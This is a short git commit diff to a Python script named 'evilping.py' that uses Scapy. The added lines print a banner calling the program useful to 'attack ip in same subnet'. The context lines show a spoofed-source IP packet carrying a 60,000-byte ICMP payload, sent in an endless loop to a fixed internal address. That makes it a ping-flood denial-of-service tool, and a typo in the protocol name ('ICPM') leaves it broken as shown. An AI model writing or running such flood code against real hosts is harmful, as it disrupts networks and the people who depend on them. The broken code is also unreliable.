9f3e76917fb9772800dc6808993e8d8ee4d05326
Rayga Lightscene <arga@lahardi.com>
2016-06-10 15:04:14 +0700

    Update evilping.py

--- evilping.py
+++ evilping.py
@@ -1,5 +1,11 @@
 from scapy.all import *
 
+print "-"*60
+print "This program very useful for attack ip in same subnet with us"
+print "But this very weakness if you attacking some website in other network"
+print "-"*60
+
+
 ip1 = IP(src="10.133.1.181",dst="10.133.1.153")
 packet = ip1/ICPM()/("m"*60000)
 while True:
